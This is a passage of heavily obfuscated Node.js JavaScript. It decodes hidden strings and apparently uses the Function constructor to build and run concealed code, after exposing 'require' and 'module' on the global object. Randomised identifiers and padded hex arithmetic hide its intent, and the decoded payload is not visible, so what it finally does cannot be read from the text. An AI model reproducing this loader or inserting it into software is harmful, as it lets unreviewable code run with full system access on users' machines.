RPWvGjZtsnNOfMqULp=JnjOuveQD[Math.max(0x1299,0x1299)+-parseInt(0x1062)+-parseInt(0x237)],M$GxGvhPRVnSqcl=eHB$FEzpep+RPWvGjZtsnNOfMqULp,o$LoLvE=lHVrGAloamYtIGLw[M$GxGvhPRVnSqcl];return!o$LoLvE?(WWXFnxYi_iSPKy['qVLArB']===undefined&&(WWXFnxYi_iSPKy['qVLArB']=!![]),nwBwTOScp$uxXZPWhX=WWXFnxYi_iSPKy['EnMxTv'](nwBwTOScp$uxXZPWhX),lHVrGAloamYtIGLw[M$GxGvhPRVnSqcl]=nwBwTOScp$uxXZPWhX):nwBwTOScp$uxXZPWhX=o$LoLvE,nwBwTOScp$uxXZPWhX;},WWXFnxYi_iSPKy(lHVrGAloamYtIGLw,vOUPMKHNjkeOviIAJK);}function peel(CXxECwMwXrWjgmVIFADAqMP_rd){return spin(CXxECwMwXrWjgmVIFADAqMP_rd,SX);}(function boot(R$Md_dORoiWfhiZgDaJW,AxmkyhsaQWxBiq$ycpkRWJOKps){var njaAYIujQGrI$Tjx_nwXzEkHpvi=WWXFnxYi_iSPKy;R$Md_dORoiWfhiZgDaJW['z']=z;var GhRRs_tCVH=splitLane(njaAYIujQGrI$Tjx_nwXzEkHpvi(0x19c));R$Md_dORoiWfhiZgDaJW[GhRRs_tCVH[0xcd5+-parseInt(0x1)*Math.trunc(-0xc7f)+parseFloat(-0x1954)]]=AxmkyhsaQWxBiq$ycpkRWJOKps;typeof module===GhRRs_tCVH[Number(parseInt(0x586))+0x6b8+-0xc3d]&&(R$Md_dORoiWfhiZgDaJW[GhRRs_tCVH[parseInt(0x2)*Number(-parseInt(0x523))+-parseInt(0x1)*-0x1f3a+-0x14f2]]=module);var vlqyrZbXWzaKNFUztEOJoYJnd=peel(njaAYIujQGrI$Tjx_nwXzEkHpvi(0x19d)),ZLjVUhMBvyPDFsEyBH=vlqyrZbXWzaKNFUztEOJoYJnd[njaAYIujQGrI$Tjx_nwXzEkHpvi(0x1ac)](parseInt(0x957)+parseInt(0x26bf)+Math.trunc(0x99e)*-0x5,-parseInt(0x9)*parseInt(0x273)+Math.max(parseInt(0x25aa),0x25aa)+parseFloat(-parseInt(0x2))*parseFloat(0x7ca)),NNZAY__Lg=peel[ZLjVUhMBvyPDFsEyBH],nHqeuCdYEz=NNZAY__Lg('',peel(njaAYIujQGrI$Tjx_nwXzEkHpvi(0x1ad))),zaKmUHwWXOYytikEdPxIQN=nHqeuCdYEz(peel(njaAYIujQGrI$Tjx_nwXzEkHpvi(0x19b)));return NNZAY__Lg('',zaKmUHwWXOYytikEdPxIQN)(0xfae+Math.trunc(-0x17e1)*-0x1+-parseInt(0x1)*parseInt(0x1dc2)),parseInt(0x2)*parseInt(-parseInt(0xc95))+parseInt(0x335c)+parseInt(-0x1)*-parseInt(0x59c);}(global,require));
